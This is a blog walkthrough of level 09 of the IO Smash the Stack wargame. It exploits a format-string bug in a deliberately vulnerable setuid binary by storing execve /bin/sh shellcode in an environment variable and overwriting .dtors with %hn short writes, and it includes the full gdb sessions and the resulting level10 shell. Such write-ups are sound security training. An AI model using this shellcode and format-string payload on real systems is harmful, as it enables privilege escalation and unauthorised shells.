+++
title = "IO Smash the stack level 09"
date = "2016-02-13T23:01:00-02:00"
publishdate = "2016-02-13"
categories =["Security"]
tags = ["Wargames", "C"]
slug = "io-smashthestack-level-09"
project_url = "https://greyhat.dk/io-smashthestack-level-09"
type = "post"
description = "Walk-through"
image = "binary.png"
image_alt = "Binary pattern"
+++

## Level09

```sh
level9@io:/levels$ ls -latr level09*
-r-------- 1 level9  level9  182 Jan  9  2010 level09.c
-r-sr-x--- 1 level10 level9 6294 Jan  9  2010 level09
```

level9@io:/levels$ cat level09.c
```c
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv) {
	int  pad = 0xbabe;
	char buf[1024];
	strncpy(buf, argv[1], sizeof(buf) - 1);

	printf(buf);

	return 0;
}
```

A nice string format bug. Alright this should be a walk in the park using short writes when overwriting the .dtors. Lets go

```sh
ilevel9@io:/levels$ export EGG=$(python -c 'print "\x31\xc0\x99\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x89\xe2\x53\x89\xe1\xcd\x80"')
level9@io:/levels$ /tmp/desdic1/getenv EGG /levels/level09
EGG will be at 0xbffffeca
level9@io:/levels$ gdb -q /levels/level09
Reading symbols from /levels/level09...done.
(gdb) quit
level9@io:/levels$ nm ./level09|grep __DTOR
080494d4 d __DTOR_END__
080494d0 d __DTOR_LIST__
level9@io:/levels$ gdb -q /levels/level09
Reading symbols from /levels/level09...done.
(gdb) p 0xbfff - 8
$1 = 49143
(gdb) p 0xfeca - 0xbfff
$2 = 16075
(gdb) r $(printf "\xd6\x94\x04\x08\xd4\x94\x04\x08")%49143x%4\$hn%16075x%5\$hn
Starting program: /levels/level09 $(printf "\xd6\x94\x04\x08\xd4\x94\x04\x08")%49143x%4\$hn%16075x%5\$hn
...
bffffe5b
...
Program received signal SIGSEGV, Segmentation fault.
0xbffffedc in ?? ()
```

Oki we did not get a shell .. Lets try with the new info we got. We know that it crashed because it pointed to 0xbffffedc which is 18 bytes past our EGG

```sh
(gdb) i reg
eax            0xffffffda	-38
ecx            0xbffffb84	-1073742972
edx            0xbffffb88	-1073742968
ebx            0x80495a8	134518184
esp            0xbffffb80	0xbffffb80
ebp            0xbffffb99	0xbffffb99
esi            0x0	0
edi            0xb7fff908	-1207961336
eip            0xbffffedc	0xbffffedc
eflags         0x10292	[ AF SF IF RF ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
(gdb) p 0xfedc - 0xfeca
$3 = 18
(gdb) !echo "16075 - 18"|bc
16057
(gdb) r $(printf "\xd6\x94\x04\x08\xd4\x94\x04\x08")%49143x%4\$hn%16057x%5\$hn
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /levels/level09 $(printf "\xd6\x94\x04\x08\xd4\x94\x04\x08")%49143x%4\$hn%16057x%5\$hn
...
bffffe5b
...
                                                                            process 2883 is executing new program: /bin/bash
sh-4.2$
```

And we got a shell but do to gdb we are still level9. Lets try the original without gdb

```sh
level9@io:/levels$ /levels/level09 $(printf "\xd6\x94\x04\x08\xd4\x94\x04\x08")%49143x%4\$hn%16075x%5\$hn
...
bffffe59
...
sh-4.2$ whoami
level10
```

Oki so what happend. Our EGG is located at 0xbffffeca. When using short writes we have to split our address into words (And decimal)

```sh
echo "ibase=16; BFFF"|bc
49151
echo "ibase=16; FECA"|bc
65226
echo "65226 - 49151"|bc
16075
```

First we convert 0xbfff into decimal (49151) and then 0xfeca (65226) and find the difference hence finding 16075. But before we can use 49151 we need to take account that we added 8 bytes to the stack (The 2 addresses for .dtor) hence getting 49143. So we write 0xbfff to 080494d6 and 0xfeca to 080494d4 pointing our destructor to our EGG.
